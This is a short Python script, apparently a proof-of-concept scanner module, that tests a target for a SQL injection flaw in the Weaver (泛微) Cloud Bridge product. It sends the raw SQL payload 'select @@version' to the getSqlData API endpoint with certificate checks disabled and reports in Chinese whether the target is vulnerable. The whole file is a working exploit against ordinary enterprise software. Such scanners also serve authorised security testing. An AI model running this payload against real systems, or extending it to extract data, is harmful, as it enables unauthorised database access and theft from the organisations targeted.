import time
import requests
from rich.console import Console
import urllib3

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    exp_url=target_url+'Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version'
    console.print(now_time() + " [INFO]     正在检测泛微云桥getdatasql注入", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False, timeout=15)
        if response.status_code== 200 and 'data' in response.text:
            console.print(now_time() + ' [SUCCESS]  存在泛微云桥getdatasql注入漏洞:{}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + " [WARNING]  可能不存在泛微云桥getdatasql注入漏洞", style='bold red')
    except:
        console.print(now_time() + ' [WARNING]  请求失败，可能无法与目标建立连接或目标不存在', style='bold red')
        
